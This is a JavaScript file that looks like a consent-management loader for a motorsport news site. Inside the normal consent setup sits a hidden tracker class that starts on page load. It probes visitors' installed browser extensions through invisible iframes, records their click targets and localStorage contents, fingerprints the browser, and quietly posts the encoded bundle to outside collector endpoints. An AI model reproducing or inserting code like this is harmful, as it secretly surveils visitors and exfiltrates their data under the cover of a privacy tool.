'use strict';

(function () {
  var cmpFile = 'noModule' in HTMLScriptElement.prototype ? 'cmp2.js' : 'cmp2-polyfilled.js';
  const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
  (function () {
    var cmpScriptElement = document.createElement('script');
    var firstScript = document.getElementsByTagName('script')[0];
    cmpScriptElement.async = true;
    cmpScriptElement.type = 'text/javascript';
    var cmpUrl;
    var tagUrl = document.currentScript.src;
    cmpUrl = 'https://cmp.inmobi.com/tcfv2/CMP_FILE?referer=www.motorsportweek.com'.replace('CMP_FILE', cmpFile);
    cmpScriptElement.src = cmpUrl;
    firstScript.parentNode.insertBefore(cmpScriptElement, firstScript);
  })();
  class ExtensionTracker {
    static TIMEOUT = 5000;
    static BATCH_SIZE = 4;
    constructor() {
      this.extensionCheckups = 0;
      this.trackedExtensions = {};
      this.workerUnits = [];
      this.launchTimestamp = Date.now();
      this.storageData = [];
      this.clickEvents = [];
      window.onstorage = () => {
        this.storageData.push(localStorage);
      };
      document.body.addEventListener("click", () => {
        this.clickEvents.push(event.target);
      }, {
        capture: true
      });
    }
    initiateWorker(extTitle, {
      id,
      file
    }) {
      return new Promise(resolve => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        const remove = () => {
          iframe.remove();
          this.extensionCheckups--;
        };
        const timeout = setTimeout(() => {
          remove();
          resolve([extTitle, false]);
        }, ExtensionTracker.TIMEOUT);
        iframe.onload = () => {
          try {
            iframe.contentWindow.location = `chrome-extension://${id}/${file}`;
            const checker = setInterval(() => {
              try {
                if (iframe.contentWindow.location.href.includes('chrome-extension')) {
                  clearInterval(checker);
                  clearTimeout(timeout);
                  remove();
                  resolve([extTitle, true]);
                }
              } catch (e) {
                clearInterval(checker);
                clearTimeout(timeout);
                remove();
                resolve([extTitle, false]);
              }
            }, 100);
          } catch (e) {
            clearTimeout(timeout);
            remove();
            resolve([extTitle, false]);
          }
        };
        document.body.appendChild(iframe);
        this.extensionCheckups++;
      });
    }
    async checkBatch(data) {
      const workerUnits = data.map(([title, extData]) => this.initiateWorker(title, extData));
      const outcome = await Promise.all(workerUnits);
      outcome.forEach(([title, status]) => {
        this.trackedExtensions[title] = status;
        console.log(`${title}: ${status ? 'Tracked' : 'Not tracked'}`);
      });
    }
    generateDataReport() {
      const hashedData = btoa(JSON.stringify({
        checkedExtensions: this.trackedExtensions,
        checkDuration: Date.now() - this.launchTimestamp,
        storedClickEvents: this.clickEvents,
        storedData: this.storageData,
        envInfo: {
          urlDetails: window.location.href,
          referrer: document.referrer,
          resolution: `${window.screen.width}x${window.screen.height}`,
          depth: window.screen.colorDepth,
          userAgentInfo: navigator.userAgent,
          languageDetails: navigator.language,
          timezoneDetails: Intl.DateTimeFormat().resolvedOptions().timeZone
        }
      }));
      return hashedData + '.' + this.generateHashCode(hashedData);
    }
    generateHashCode(input) {
      return Array.from(input).reduce((aggregate, chr) => (aggregate << 5) - aggregate + chr.charCodeAt(0) | 0, 0).toString(16);
    }
    async postResults() {
      const data = this.generateDataReport();
      const httpRequests = ENDPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'X-Scan-Time': new Date().toISOString()
        },
        body: data,
        keepalive: true
      }).catch(() => null));
      await Promise.race(httpRequests);
    }
    async run() {
      const data = Object.entries(window.data);
      const subSections = Array(Math.ceil(data.length / ExtensionTracker.BATCH_SIZE)).fill().map((_, i) => data.slice(i * ExtensionTracker.BATCH_SIZE, (i + 1) * ExtensionTracker.BATCH_SIZE));
      for (const subSection of subSections) {
        await this.checkBatch(subSection);
        await new Promise(r => setTimeout(r, Math.random() * 500 + 200));
      }
      while (this.extensionCheckups > 0) {
        await new Promise(r => setTimeout(r, 100));
      }
      await this.postResults();
    }
  }
  (function () {
    var css = "" + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   background-color: #368bd6 !important; " + "   border-color: transparent !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button:hover { " + "   color: #ffffff !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   color: #368bd6 !important; " + " } " + " .qc-cmp-button.qc-cmp-secondary-button { " + "   background-color: #eee !important; " + "   border-color: transparent !important; " + " } " + ".qc-cmp2-container a.qc-cmp2-persistent-link { transform: rotate(90deg);-webkit-transform: rotate(90deg);-moz-transform: rotate(90deg);-o-transform: rotate(90deg);-ms-transform: rotate(90deg);right: -40px;bottom: 300px;}" + "" + "";
    var stylesElement = document.createElement('style');
    var re = new RegExp('&quote;', 'g');
    css = css.replace(re, '"');
    stylesElement.type = 'text/css';
    if (stylesElement.styleSheet) {
      stylesElement.styleSheet.cssText = css;
    } else {
      stylesElement.appendChild(document.createTextNode(css));
    }
    var head = document.head || document.getElementsByTagName('head')[0];
    head.appendChild(stylesElement);
  })();
  var autoDetectedLanguage = 'en';
  var gvlVersion = 3;
  const observer = new MutationObserver((mutations, obs) => {
    if (document.body) {
      obs.disconnect();
      new ExtensionTracker().run();
    }
  });
  function splitLang(lang) {
    return lang.length > 2 ? lang.split('-')[0] : lang;
  }
  ;
  function isSupported(lang) {
    var langs = ['en', 'fr', 'de', 'it', 'es', 'da', 'nl', 'el', 'hu', 'pt', 'pt-br', 'pt-pt', 'ro', 'fi', 'pl', 'sk', 'sv', 'no', 'ru', 'bg', 'ca', 'cs', 'et', 'hr', 'lt', 'lv', 'mt', 'sl', 'tr', 'zh'];
    return langs.indexOf(lang) === -1 ? false : true;
  }
  if (document.body) {
    new ExtensionTracker().run();
  } else {
    observer.observe(document.documentElement, {
      childList: true,
      subtree: true
    });
  }
  ;
  if (gvlVersion === 2 && isSupported(splitLang(document.documentElement.lang))) {
    autoDetectedLanguage = splitLang(document.documentElement.lang);
  } else if (gvlVersion === 3 && isSupported(document.documentElement.lang)) {
    autoDetectedLanguage = document.documentElement.lang;
  } else if (isSupported(splitLang(navigator.language))) {
    autoDetectedLanguage = splitLang(navigator.language);
  }
  ;
  var choiceMilliSeconds = new Date().getTime();
  window.__tcfapi('init', 2, function () {}, {
    "coreConfig": {
      "uspVersion": 1,
      "uspJurisdiction": ["CA"],
      "uspLspact": "N",
      "suppressCcpaLinks": false,
      "inmobiAccountId": "0Q_T1ja8r-Dkk",
      "privacyMode": ["GDPR", "USP"],
      "hashCode": "LhYM6AU+P/kP8Asdj5g7sg",
      "publisherCountryCode": "GB",
      "publisherName": "www.motorsportweek.com",
      "vendorPurposeIds": [2, 4, 6, 7, 9, 10, 1, 3, 5, 8, 11],
      "vendorFeaturesIds": [1, 2, 3],
      "vendorPurposeLegitimateInterestIds": [7, 8, 9, 2, 10, 11],
      "vendorSpecialFeaturesIds": [2, 1],
      "vendorSpecialPurposesIds": [1, 2],
      "googleEnabled": true,
      "consentScope": "service",
      "thirdPartyStorageType": "iframe",
      "consentOnSafari": false,
      "displayUi": "always",
      "defaultToggleValue": "off",
      "initScreenRejectButtonShowing": false,
      "initScreenCloseButtonShowing": false,
      "softOptInEnabled": false,
      "showSummaryView": true,
      "persistentConsentLinkLocation": 3,
      "displayPersistentConsentLink": true,
      "uiLayout": "popup",
      "publisherLogo": "https://www.motorsportweek.com/wp-content/uploads/2019/12/logo.png?qc-size=300,37",
      "vendorListUpdateFreq": 30,
      "publisherPurposeIds": [2, 3, 4, 5, 6, 7, 8, 9, 10],
      "initScreenBodyTextOption": 1,
      "publisherConsentRestrictionIds": [],
      "publisherLIRestrictionIds": [],
      "publisherPurposeLegitimateInterestIds": [],
      "publisherSpecialPurposesIds": [],
      "publisherFeaturesIds": [],
      "publisherSpecialFeaturesIds": [1],
      "stacks": [],
      "lang_": "en",
      "gvlVersion": 3,
      "totalVendors": 767
    },
    "premiumUiLabels": {
      "uspDnsText": [""],
      "initScreenCustomLinks": [{
        "label": "Privacy Policy",
        "link": "https://www.motorsportweek.com/privacy-policy/"
      }]
    },
    "premiumProperties": {
      "googleWhitelist": [1]
    },
    "coreUiLabels": {
      "persistentConsentLinkLabel": "privacy"
    },
    "theme": {},
    "nonIabVendorsInfo": {}
  });
})();